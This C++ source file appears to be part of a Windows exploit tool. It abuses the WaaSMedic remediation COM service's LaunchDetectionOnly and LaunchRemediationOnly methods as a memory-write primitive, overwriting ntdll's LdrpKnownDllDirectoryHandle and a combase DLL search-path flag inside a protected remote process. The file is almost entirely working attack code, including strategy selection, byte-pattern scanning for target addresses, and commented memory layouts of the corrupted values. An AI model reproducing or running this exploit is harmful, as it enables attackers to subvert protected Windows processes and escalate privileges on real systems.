#include "WaaSMedicClient.h"
#include "Utils.h"
#include "globaldef.h"

WaaSMedicClient::WaaSMedicClient() : WaaSMedicClient(NULL, 0) { }

WaaSMedicClient::WaaSMedicClient(ULONG_PTR BaseAddress, ULONG TargetValue)
{
    _ClientReady = TRUE;
    _BaseAddress = BaseAddress;
    _TargetValue = TargetValue;
    _WaaSRemediationEx = NULL;
    _Timeout = TIMEOUT;
    _DispIdLaunchDetectionOnly = 0;
    _DispIdLaunchRemediationOnly = 0;
    _Application = SysAllocString(L"");
    _Plugins = SysAllocString(L"");

    //
    // If the target handle value is 0x18, 0x38, 0x58 (etc.), we have a higher chance of hitting
    // the right value if we extract the first byte (index 0) of the returned heap address.
    //
    if (this->_TargetValue >= 0x18)
    {
        this->_Strategy = ((this->_TargetValue - 0x18) % 32 == 0) ? ExploitStrategy::ExtractByteAtIndex0 : ExploitStrategy::ExtractByteAtIndex1;
    }
    //
    // Otherwise, extract the second byte (index 1) of the returned heap address.
    //
    else
    {
        this->_Strategy = ExploitStrategy::ExtractByteAtIndex1;
    }

    this->_ComResult = CoInitializeEx(0, COINIT_MULTITHREADED);

    if (this->InitializeInterface())
    {
        if (!this->ResolveDispatchIds())
        {
            this->_ClientReady = FALSE;
        }
    }
    else
    {
        this->_ClientReady = FALSE;
    }

    if (!this->CalculateWriteAddresses())
        this->_ClientReady = FALSE;

    this->_ComResult = CoEnableCallCancellation(NULL);

    DEBUG(L"Strategy: %d | COM result: 0x%08x | Client ready: %d", this->_Strategy, this->_ComResult, this->_ClientReady);
}

WaaSMedicClient::~WaaSMedicClient()
{
    Utils::SafeRelease((IUnknown**)&this->_WaaSRemediationEx);
    this->_ComResult = CoDisableCallCancellation(NULL);
    CoUninitialize();
}

BOOL WaaSMedicClient::WriteRemoteDllSearchPathFlag()
{
    BOOL bResult = FALSE;
    ULONG_PTR pDllSearchPathFlagAddress;
    WRITE_REMOTE_DLL_SEARCH_PATH_FLAG_PARAM WriteParams;
    DWORD dwThreadId, dwThreadExitCode = 0;
    HANDLE hThread = NULL;
    
    EXIT_ON_ERROR(!this->FindCombaseDllSearchFlagAddress(&pDllSearchPathFlagAddress));
    EXIT_ON_ERROR(!_ClientReady);

    ZeroMemory(&WriteParams, sizeof(WriteParams));
    WriteParams.CallerApplicationName = this->_Application;
    WriteParams.Plugins = this->_Plugins;
    WriteParams.DispIdLaunchRemediationOnly = this->_DispIdLaunchRemediationOnly;
    WriteParams.WaaSRemediationEx = this->_WaaSRemediationEx;
    WriteParams.WriteAt = pDllSearchPathFlagAddress - 8;

    EXIT_ON_ERROR((hThread = CreateThread(NULL, 0, WriteRemoteDllSearchPathFlagThread, &WriteParams, 0, &dwThreadId)) == NULL);

    if (WaitForSingleObject(hThread, this->_Timeout) != WAIT_OBJECT_0)
    {
        DEBUG(L"Thread with ID %d is taking too long, cancelling...", dwThreadId);
        this->_ComResult = CoCancelCall(dwThreadId, TIMEOUT);
        SetLastError(ERROR_TIMEOUT);
        goto cleanup;
    }

    EXIT_ON_ERROR(!GetExitCodeThread(hThread, &dwThreadExitCode));
    EXIT_ON_ERROR(dwThreadExitCode != ERROR_SUCCESS);

    bResult = TRUE;

cleanup:
    DEBUG(L"COM result: 0x%08x | Result: %d", this->_ComResult, bResult);

    Utils::SafeCloseHandle(&hThread);

    if (!bResult)
        ERROR(L"Failed to write DLL search path flag in remote process (thread exit code: 0x%08x).\n", dwThreadExitCode);

    return bResult;
}

BOOL WaaSMedicClient::WriteRemoteKnownDllHandle()
{
    BOOL bResult = FALSE;
    WRITE_REMOTE_KNOWN_DLL_HANDLE_PARAM WriteParams;
    DWORD dwThreadId, dwThreadExitCode = ERROR_SUCCESS;
    HANDLE hThread = NULL;

    EXIT_ON_ERROR(!_ClientReady);

    ZeroMemory(&WriteParams, sizeof(WriteParams));
    WriteParams.CallerApplicationName = this->_Application;
    WriteParams.Plugins = this->_Plugins;
    WriteParams.DispIdLaunchDetectionOnly = this->_DispIdLaunchDetectionOnly;
    WriteParams.DispIdLaunchRemediationOnly = this->_DispIdLaunchRemediationOnly;
    WriteParams.Strategy = this->_Strategy;
    WriteParams.WaaSRemediationEx = this->_WaaSRemediationEx;
    WriteParams.WriteAtLaunchDetectionOnly = this->_WriteAtLaunchDetectionOnly;
    WriteParams.WriteAtLaunchRemediationOnly = this->_WriteAtLaunchRemediationOnly;

    EXIT_ON_ERROR((hThread = CreateThread(NULL, 0, WriteRemoteKnownDllHandleThread, &WriteParams, 0, &dwThreadId)) == NULL);

    if (WaitForSingleObject(hThread, this->_Timeout) != WAIT_OBJECT_0)
    {
        DEBUG(L"Thread with ID %d is taking too long, cancelling...", dwThreadId);
        this->_ComResult = CoCancelCall(dwThreadId, TIMEOUT);
        SetLastError(ERROR_TIMEOUT);
        goto cleanup;
    }

    EXIT_ON_ERROR(!GetExitCodeThread(hThread, &dwThreadExitCode));
    EXIT_ON_ERROR(dwThreadExitCode != ERROR_SUCCESS);

    bResult = TRUE;

cleanup:
    //DEBUG(L"COM result: 0x%08x | Result: %d", this->_ComResult, bResult);
    Utils::SafeCloseHandle(&hThread);

    if (!bResult)
        ERROR(L"Failed to write LdrpKnownDllDirectoryHandle value (thread exit code: 0x%08x).", dwThreadExitCode);
    
    return bResult;
}

BOOL WaaSMedicClient::CreateTaskHandlerInstance()
{
    BOOL bResult = FALSE;
    HANDLE hThread = NULL;
    DWORD dwThreadId;
    
    EXIT_ON_ERROR((hThread = CreateThread(NULL, 0, CreateTaskHandlerInstanceThread, NULL, 0, &dwThreadId)) == NULL);

    if (WaitForSingleObject(hThread, this->_Timeout) != WAIT_OBJECT_0)
    {
        DEBUG(L"Thread with ID %d is taking too long, cancelling...", dwThreadId);
        this->_ComResult = CoCancelCall(dwThreadId, TIMEOUT);
        SetLastError(ERROR_TIMEOUT);
        goto cleanup;
    }

    bResult = TRUE;

cleanup:
    Utils::SafeCloseHandle(&hThread);

    if (!bResult)
        ERROR(L"Unexpected error or timeout while trying to create a remote TaskHandler instance.");

    return bResult;
}

BOOL WaaSMedicClient::InitializeInterface()
{
    BOOL bResult = FALSE;

    EXIT_ON_ERROR(FAILED(this->_ComResult = CoCreateInstance(CLSID_WAASREMEDIATION, NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&this->_WaaSRemediationEx))));
    bResult = TRUE;

cleanup:
    DEBUG(L"COM result: 0x%08x | Result: %d", this->_ComResult, bResult);

    return bResult;
}

BOOL WaaSMedicClient::ResolveDispatchIds()
{
    BOOL bResult = FALSE;
    LPWSTR pwszLaunchDetectionOnly, pwszLaunchRemediationOnly;

    pwszLaunchDetectionOnly = const_cast<wchar_t*>(STR_METHOD_LAUNCHDETECTIONONLY);
    pwszLaunchRemediationOnly = const_cast<wchar_t*>(STR_METHOD_LAUNCHREMEDIATIONONLY);

    EXIT_ON_ERROR(FAILED(this->_ComResult = this->_WaaSRemediationEx->GetIDsOfNames(IID_NULL, &pwszLaunchDetectionOnly, 1, 1033, &this->_DispIdLaunchDetectionOnly)));
    EXIT_ON_ERROR(FAILED(this->_ComResult = this->_WaaSRemediationEx->GetIDsOfNames(IID_NULL, &pwszLaunchRemediationOnly, 1, 1033, &this->_DispIdLaunchRemediationOnly)));

    bResult = TRUE;

cleanup:
    DEBUG(L"LDO ID: 0x%08x | LRO ID: 0x%08x | COM result: 0x%08x | Result: %d", this->_DispIdLaunchDetectionOnly, this->_DispIdLaunchRemediationOnly, this->_ComResult, bResult);

    return bResult;
}

BOOL WaaSMedicClient::FindCombaseDllSearchFlagAddress(PULONG_PTR Address)
{
    BOOL bResult = FALSE;
    HMODULE hCombaseModule = NULL;
    ULONG_PTR pCombaseTextSection = 0, pCombaseDataSection = 0, pCombaseDataSectionLimit, pPatternAddress = 0, pPatternAddress2 = 0;
    DWORD dwCombaseTextSectionSize = 0, dwCombaseDataSectionSize = 0, dwPatternOffset, i;
    BYTE bPattern[] = { 0x01, 0x00, 0x13, 0x00 };

    DWORD dwRipRelativeOffsetForward, dwRipRelativeOffsetBackward;
    ULONG_PTR pCandidateAddressTemp, pCandidateAddressForward = 0, pCandidateAddressBackward = 0;

    *Address = 0;

    EXIT_ON_ERROR((hCombaseModule = LoadLibraryW(STR_MOD_COMBASE)) == NULL);
    EXIT_ON_ERROR(!Utils::FindModuleSection(hCombaseModule, ".text", &pCombaseTextSection, &dwCombaseTextSectionSize));
    EXIT_ON_ERROR(!Utils::FindModuleSection(hCombaseModule, ".data", &pCombaseDataSection, &dwCombaseDataSectionSize));
    EXIT_ON_ERROR(!Utils::FindModulePattern(bPattern, sizeof(bPattern), pCombaseTextSection, dwCombaseTextSectionSize, &pPatternAddress));

    //
    // Ensure that the pattern is unique. We search for the pattern once again starting at offset + 1 until
    // we reach the end of the .text section. If we find another occurrence, we should exit safely.
    //

    dwPatternOffset = (DWORD)(pPatternAddress - (ULONG_PTR)hCombaseModule);
    EXIT_ON_ERROR(Utils::FindModulePattern(bPattern, sizeof(bPattern), pCombaseTextSection + dwPatternOffset + 1, dwCombaseTextSectionSize - dwPatternOffset - 1, &pPatternAddress2));

    //
    // Now that we found the offset of our pattern in the code, we can start searching forward and backward for
    // valid RIP-relative offsets. We consider that a RIP-relative offset is 'valid' when the value corresponding
    // to the sum of RIP and this offset falls within the .data section. We do the search both forward and 
    // backward and compare the obtained values at the end. If the values are not equal, we should exit safely.
    //

    pCombaseDataSectionLimit = pCombaseDataSection + dwCombaseDataSectionSize;

    for (i = 0; i < 32; i++)
    {
        RtlMoveMemory(&dwRipRelativeOffsetForward, (PVOID)(pPatternAddress + i), sizeof(dwRipRelativeOffsetForward));
        pCandidateAddressTemp = pPatternAddress + i + sizeof(dwRipRelativeOffsetForward) + dwRipRelativeOffsetForward;
        if (pCandidateAddressTemp >= pCombaseDataSection && pCandidateAddressTemp < pCombaseDataSectionLimit)
        {
            pCandidateAddressForward = pCandidateAddressTemp;
            DEBUG(L"Found forward candidate:  0x%016llx", pCandidateAddressForward);
        }

        RtlMoveMemory(&dwRipRelativeOffsetBackward, (PVOID)(pPatternAddress - sizeof(bPattern) - i), sizeof(dwRipRelativeOffsetBackward));
        pCandidateAddressTemp = pPatternAddress - sizeof(bPattern) - i + sizeof(dwRipRelativeOffsetBackward) + dwRipRelativeOffsetBackward;
        if (pCandidateAddressTemp >= pCombaseDataSection && pCandidateAddressTemp < pCombaseDataSectionLimit)
        {
            pCandidateAddressBackward = pCandidateAddressTemp;
            DEBUG(L"Found backward candidate: 0x%016llx", pCandidateAddressBackward);
        }
    }

    EXIT_ON_ERROR(!pCandidateAddressForward || !pCandidateAddressBackward);
    EXIT_ON_ERROR(pCandidateAddressForward != pCandidateAddressBackward);

    *Address = pCandidateAddressForward;
    bResult = TRUE;

cleanup:
    DEBUG(L"DLL search path flag address: 0x%016llx | Result: %d", *Address, bResult);

    return bResult;
}

BOOL WaaSMedicClient::CalculateWriteAddresses()
{
    //
    // _BaseAddress: address of ntdll!LdrpKnownDllDirectoryHandle
    // _WriteAtLaunchDetectionOnly: address used to write the result of LaunchDetectionOnly
    // _WriteAtLaunchRemediationOnly: address used to write the result of LaunchRemediationOnly
    //
    // First strategy: keep value at index 0
    // 
    //   After the call to LaunchDetectionOnly
    //     00007fff`971dc028  00 00 00 00  00 00 00 00    <- (LdrpFatalHardErrorCount)
    //     00007fff`971dc030  HH XX XX XX  XX XX 00 00    <- LdrpKnownDllDirectoryHandle
    //     00007fff`971dc038  00 00 00 00  00 00 00 00    <- NOT USED
    // 
    //   After the call to LaunchRemediationOnly (1)
    //     00007fff`971dc028  00 17 00 00  00 00 00 00    <- (LdrpFatalHardErrorCount)
    //     00007fff`971dc030  HH 00 00 00  00 XX 00 00    <- LdrpKnownDllDirectoryHandle
    //     00007fff`971dc038  00 00 00 00  00 00 00 00    <- NOT USED
    // 
    //      After the call to LaunchRemediationOnly (2)
    //     00007fff`971dc028  00 17 17 00  00 00 00 00    <- (LdrpFatalHardErrorCount)
    //     00007fff`971dc030  HH 00 00 00  00 00 00 00    <- LdrpKnownDllDirectoryHandle
    //     00007fff`971dc038  00 00 00 00  00 00 00 00    <- NOT USED
    // 
    // Second strategy: keep value at index 1
    // 
    //   After the call to LaunchDetectionOnly
    //     00007fff`971dc028  00 00 00 00  00 00 00 XX    <- (LdrpFatalHardErrorCount)
    //     00007fff`971dc030  HH XX XX XX  XX 00 00 00    <- LdrpKnownDllDirectoryHandle
    //     00007fff`971dc038  00 00 00 00  00 00 00 00    <- NOT USED
    //
    //   After the call to LaunchRemediationOnly
    //     00007fff`971dc028  00 17 00 00  00 00 00 XX    <- (LdrpFatalHardErrorCount)
    //     00007fff`971dc030  HH 00 00 00  00 00 00 00    <- LdrpKnownDllDirectoryHandle
    //     00007fff`971dc038  00 00 00 00  00 00 00 00    <- NOT USED
    //

    if (_Strategy == ExploitStrategy::ExtractByteAtIndex0)
    {
        this->_WriteAtLaunchDetectionOnly = (DWORD64)this->_BaseAddress;       // Write value XX XX XX XX XX XX 00 00 @ ntdll!LdrpKnownDllDirectoryHandle
        this->_WriteAtLaunchRemediationOnly = (DWORD64)this->_BaseAddress - 7; // Write 00 00 00 00 @ LdrpKnownDllDirectoryHandle+1 (+1 again for the second call)
        return TRUE;
    }
    else if (_Strategy == ExploitStrategy::ExtractByteAtIndex1)
    {
        this->_WriteAtLaunchDetectionOnly = (DWORD64)this->_BaseAddress - 1;   // Write value XX XX XX XX XX XX 00 00 @ ntdll!LdrpKnownDllDirectoryHandle-1
        this->_WriteAtLaunchRemediationOnly = (DWORD64)this->_BaseAddress - 7; // Write 00 00 00 00 @ LdrpKnownDllDirectoryHandle+1
        return TRUE;
    }

    return FALSE;
}

HRESULT WaaSMedicClient::InvokeLaunchDetectionOnly(IWaaSRemediationEx* Interface, DISPID DispId, BSTR CallerApplicationName, ULONG_PTR Result)
{
    DISPPARAMS Params;
    VARIANT VarResult;
    EXCEPINFO ExcepInfo;
    UINT ArgErr = 0xffffffff;
    VARIANTARG ArgLaunchDetectionOnly[2];

    ZeroMemory(&ArgLaunchDetectionOnly, sizeof(ArgLaunchDetectionOnly));
    ArgLaunchDetectionOnly[0].vt = VT_UI8;
    ArgLaunchDetectionOnly[0].ullVal = Result;
    ArgLaunchDetectionOnly[1].vt = VT_BSTR;
    ArgLaunchDetectionOnly[1].bstrVal = CallerApplicationName;

    ZeroMemory(&Params, sizeof(Params));
    Params.cArgs = sizeof(ArgLaunchDetectionOnly) / sizeof(*ArgLaunchDetectionOnly);
    Params.rgvarg = ArgLaunchDetectionOnly;
    Params.cNamedArgs = 0;
    Params.rgdispidNamedArgs = NULL;

    return Interface->Invoke(DispId, IID_NULL, 1033, DISPATCH_METHOD, &Params, &VarResult, &ExcepInfo, &ArgErr);
}

HRESULT WaaSMedicClient::InvokeLaunchRemediationOnly(IWaaSRemediationEx* Interface, DISPID DispId, BSTR Plugins, BSTR CallerApplicationName, ULONG_PTR Result)
{
    DISPPARAMS Params;
    VARIANT VarResult;
    EXCEPINFO ExcepInfo;
    UINT ArgErr = 0xffffffff;
    VARIANTARG ArgLaunchRemediationOnly[3];

    ZeroMemory(&ArgLaunchRemediationOnly, sizeof(ArgLaunchRemediationOnly));
    ArgLaunchRemediationOnly[0].vt = VT_UI8;
    ArgLaunchRemediationOnly[0].ullVal = Result;
    ArgLaunchRemediationOnly[1].vt = VT_BSTR;
    ArgLaunchRemediationOnly[1].bstrVal = CallerApplicationName;
    ArgLaunchRemediationOnly[2].vt = VT_BSTR;
    ArgLaunchRemediationOnly[2].bstrVal = Plugins;

    ZeroMemory(&Params, sizeof(Params));
    Params.cArgs = sizeof(ArgLaunchRemediationOnly) / sizeof(*ArgLaunchRemediationOnly);
    Params.rgvarg = ArgLaunchRemediationOnly;
    Params.cNamedArgs = 0;
    Params.rgdispidNamedArgs = NULL;

    return Interface->Invoke(DispId, IID_NULL, 1033, DISPATCH_METHOD, &Params, &VarResult, &ExcepInfo, &ArgErr);
}

DWORD WINAPI WaaSMedicClient::WriteRemoteDllSearchPathFlagThread(LPVOID Parameter)
{
    PWRITE_REMOTE_DLL_SEARCH_PATH_FLAG_PARAM WriteParams = (PWRITE_REMOTE_DLL_SEARCH_PATH_FLAG_PARAM)Parameter;
    HRESULT hr;

    hr = WaaSMedicClient::InvokeLaunchRemediationOnly
    (
        WriteParams->WaaSRemediationEx,
        WriteParams->DispIdLaunchRemediationOnly,
        WriteParams->Plugins,
        WriteParams->CallerApplicationName,
        WriteParams->WriteAt
    );

    if (FAILED(hr))
    {
        DEBUG(L"LaunchRemediationOnly(0x%llx): 0x%08x", WriteParams->WriteAt, hr);
        return (DWORD)hr;
    }

    return ERROR_SUCCESS;
}

DWORD WINAPI WaaSMedicClient::WriteRemoteKnownDllHandleThread(LPVOID Parameter)
{
    PWRITE_REMOTE_KNOWN_DLL_HANDLE_PARAM WriteParams = (PWRITE_REMOTE_KNOWN_DLL_HANDLE_PARAM)Parameter;
    HRESULT hr;

    hr = WaaSMedicClient::InvokeLaunchDetectionOnly
    (
        WriteParams->WaaSRemediationEx,
        WriteParams->DispIdLaunchDetectionOnly,
        WriteParams->CallerApplicationName,
        WriteParams->WriteAtLaunchDetectionOnly
    );

    if (FAILED(hr))
    {
        DEBUG(L"LaunchDetectionOnly(0x%llx): 0x%08x", WriteParams->WriteAtLaunchDetectionOnly, hr);
        return (DWORD)hr;
    }

    hr = WaaSMedicClient::InvokeLaunchRemediationOnly
    (
        WriteParams->WaaSRemediationEx,
        WriteParams->DispIdLaunchRemediationOnly,
        WriteParams->Plugins,
        WriteParams->CallerApplicationName,
        WriteParams->WriteAtLaunchRemediationOnly
    );
    
    if (FAILED(hr))
    {
        DEBUG(L"LaunchRemediationOnly(0x%llx): 0x%08x", WriteParams->WriteAtLaunchRemediationOnly, hr);
        return (DWORD)hr;
    }

    if (WriteParams->Strategy == ExploitStrategy::ExtractByteAtIndex0)
    {
        hr = WaaSMedicClient::InvokeLaunchRemediationOnly
        (
            WriteParams->WaaSRemediationEx,
            WriteParams->DispIdLaunchRemediationOnly,
            WriteParams->Plugins,
            WriteParams->CallerApplicationName,
            WriteParams->WriteAtLaunchRemediationOnly + 1
        );
        
        if (FAILED(hr))
        {
            DEBUG(L"LaunchRemediationOnly(0x%llx): 0x%08x", WriteParams->WriteAtLaunchRemediationOnly, hr);
            return (DWORD)hr;
        }
    }

    return ERROR_SUCCESS;
}

DWORD WINAPI WaaSMedicClient::CreateTaskHandlerInstanceThread(LPVOID Parameter)
{
    ITaskHandler* pTaskHandler = NULL;
    HRESULT hr = S_OK;

    if (SUCCEEDED(hr = CoCreateInstance(CLSID_WAASREMEDIATION, NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&pTaskHandler))))
    {
        pTaskHandler->Release();
    }

    return (DWORD)hr;
}
